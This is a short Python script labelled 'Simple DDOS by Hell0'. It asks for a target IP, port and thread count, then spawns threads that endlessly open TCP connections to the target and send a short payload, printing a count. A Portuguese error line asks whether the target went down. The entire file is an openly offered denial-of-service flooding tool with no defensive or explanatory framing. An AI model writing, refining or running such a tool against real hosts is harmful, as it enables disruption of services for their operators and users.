# ddos in port

import sys
import socket
import threading
import os

print("Simple DDOS by Hell0")
print("")

ip = input("IP: ")

port = input("Port: ")
port = int(port)

thread = input("Threads: ")
thread = int(thread)

print("")

cont = 0

def connection():
    
    global cont
    
    try:
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b'Hello, world')
    
        cont += 1
        
        print("Connections: ", cont)
        
    except Exception as e:
        print("Erro de conexão! Derrubou?")
    
def attack():
    
    while True:
        connection()
    
    
for i in range(thread):
    for i in range(thread):
        t = threading.Thread(target=attack)
        t.start()